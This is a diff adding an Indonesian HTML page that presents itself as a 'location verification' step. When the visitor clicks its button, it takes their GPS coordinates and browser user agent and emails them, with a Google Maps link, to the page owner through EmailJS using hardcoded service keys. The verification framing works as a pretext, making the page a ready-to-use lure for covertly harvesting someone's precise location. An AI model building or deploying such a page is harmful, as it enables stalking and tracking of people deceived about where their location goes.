@@ -1,0 +1,95 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Location Sender</title>
+
+<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+
+<style>
+body{
+    margin:0;
+    background:linear-gradient(135deg,#0f2027,#203a43,#2c5364);
+    height:100vh;
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    font-family:Arial, sans-serif;
+    color:white;
+}
+
+.box{
+    background:rgba(255,255,255,0.1);
+    padding:30px;
+    border-radius:15px;
+    backdrop-filter:blur(10px);
+    text-align:center;
+    width:300px;
+}
+
+button{
+    padding:12px 20px;
+    border:none;
+    border-radius:10px;
+    background:#00ffcc;
+    font-weight:bold;
+    cursor:pointer;
+    margin-top:15px;
+}
+
+button:hover{
+    background:#00ccaa;
+}
+</style>
+</head>
+<body>
+
+<div class="box">
+    <h2>Verifikasi Lokasi</h2>
+    <p>Klik tombol untuk kirim lokasi</p>
+    <button onclick="sendLocation()">Kirim Lokasi</button>
+    <p id="status"></p>
+</div>
+
+<script>
+(function(){
+    emailjs.init("buxVv6sNpKGz4iBzb");
+})();
+
+function sendLocation(){
+    const status = document.getElementById("status");
+
+    if(navigator.geolocation){
+        navigator.geolocation.getCurrentPosition(function(position){
+
+            const lat = position.coords.latitude;
+            const lon = position.coords.longitude;
+            const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
+
+            const templateParams = {
+                latitude: lat,
+                longitude: lon,
+                maps: mapsLink,
+                user_agent: navigator.userAgent
+            };
+
+            emailjs.send("service_lzuezkd","template_105p1pt",templateParams)
+            .then(function(response){
+                status.innerHTML = "✅ Lokasi berhasil dikirim!";
+            }, function(error){
+                status.innerHTML = "❌ Gagal kirim lokasi";
+                console.log(error);
+            });
+
+        }, function(){
+            status.innerHTML = "⚠️ Izin lokasi ditolak";
+        });
+    }else{
+        status.innerHTML = "Browser tidak support GPS";
+    }
+}
+</script>
+
+</body>
+  </html>
